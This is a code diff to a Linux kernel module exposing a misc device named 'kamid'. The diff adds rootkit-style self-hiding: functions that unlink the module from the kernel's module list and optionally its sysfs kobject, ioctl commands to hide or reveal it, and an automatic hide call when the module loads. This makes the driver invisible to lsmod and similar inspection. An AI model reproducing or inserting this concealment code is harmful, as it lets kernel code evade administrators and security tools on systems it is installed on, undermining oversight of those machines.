@@ -13,6 +13,40 @@
 
 #define DEVICE_NAME "kamid"
 
+#define DISABLE_KOBJ 0
+
+static int module_hidden = 0;
+static struct list_head *module_previous;
+#if DISABLE_KOBJ
+static struct list_head *module_kobj_previous;
+#endif
+
+void module_hide(void)
+{
+    if (module_hidden == 1) return;
+    module_previous = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+#if DISABLE_KOBJ
+    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
+#endif
+    module_hidden = 1;
+}
+
+void module_show(void)
+{
+    if (module_hidden == 0) return;
+    list_add(&THIS_MODULE->list, module_previous);
+#if DISABLE_KOBJ
+    int status;
+    status = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+    printk(KERN_INFO "kobject_add: %d", status);
+    list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
+#endif
+    module_hidden = 0;
+}
+
 static int dispatch_open(struct inode *node, struct file *file)
 {
     return 0;
@@ -100,6 +134,14 @@ static long dispatch_ioctl(struct file* const file, unsigned int const cmd, unsi
         }
         break;
 
+    case OP_HIDE_MOD:
+        module_hide();
+        break;
+
+    case OP_RED_MOD:
+        module_show();
+        break;
+
     default:
         return -EINVAL;
     }
@@ -124,6 +166,7 @@ static int __init driver_entry(void)
 {
     int ret;
     ret = misc_register(&misc);
+    module_hide();
     return ret;
 }
 
